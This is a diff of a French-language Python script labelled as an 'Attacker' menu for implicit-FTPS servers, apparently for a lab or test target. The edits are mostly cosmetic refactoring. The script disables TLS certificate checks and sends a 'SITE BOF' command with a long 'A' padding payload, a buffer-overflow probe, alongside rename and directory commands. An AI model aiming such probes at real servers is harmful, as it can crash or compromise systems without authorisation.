@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Attacker Implicit-FTPS — Menu interactif
+Attacker Implicit-FTPS — Menu interactif (13 options)
 """
 
 import os, ssl, socket, argparse
@@ -19,8 +19,7 @@ def make_ftps(host, port):
     ctx = ssl._create_unverified_context()
     ss  = ctx.wrap_socket(raw, server_hostname=host)
     ftp = FTP()
-    ftp.sock          = ss
-    ftp.file          = ss.makefile('r', encoding='utf-8', newline='\r\n')
+    ftp.sock, ftp.file = ss, ss.makefile('r', encoding='utf-8', newline='\r\n')
     ftp.af, ftp.passiveserver = ss.family, True
     banner = ftp.getresp().strip()
     print(Fore.YELLOW + "← Bannière :", banner)
@@ -89,18 +88,16 @@ def do_site_bof(ftp):
     payload = "A"*length
     try:
         resp = ftp.sendcmd(f"SITE BOF {payload}")
-        print(Fore.GREEN + "←", resp)
+        print(Fore.GREEN + "←", resp[:200] + ("…" if len(resp)>200 else ""))
     except Exception as e:
-        print(Fore.RED + "× SITE BOF:", e)
+        print(Fore.RED + "× SITE BOF fail:", e)
 
 def do_rnfr_rnto(ftp):
     old = input("RNFR file > ").strip()
     new = input("RNTO name > ").strip()
     try:
-        r1 = ftp.sendcmd(f"RNFR {old}")
-        print(Fore.GREEN + "←", r1)
-        r2 = ftp.sendcmd(f"RNTO {new}")
-        print(Fore.GREEN + "←", r2)
+        r1 = ftp.sendcmd(f"RNFR {old}"); print(Fore.GREEN + "←", r1)
+        r2 = ftp.sendcmd(f"RNTO {new}"); print(Fore.GREEN + "←", r2)
     except Exception as e:
         print(Fore.RED + "× RNFR/RNTO fail:", e)
 
@@ -115,14 +112,12 @@ def do_dele(ftp):
 def do_mkd_rmd(ftp):
     d = input("MKD directory > ").strip()
     try:
-        resp = ftp.sendcmd(f"MKD {d}")
-        print(Fore.GREEN + "←", resp)
+        resp = ftp.sendcmd(f"MKD {d}"); print(Fore.GREEN + "←", resp)
     except Exception as e:
         print(Fore.RED + "× MKD fail:", e)
     r = input("RMD directory > ").strip()
     try:
-        resp = ftp.sendcmd(f"RMD {r}")
-        print(Fore.GREEN + "←", resp)
+        resp = ftp.sendcmd(f"RMD {r}"); print(Fore.GREEN + "←", resp)
     except Exception as e:
         print(Fore.RED + "× RMD fail:", e)
 
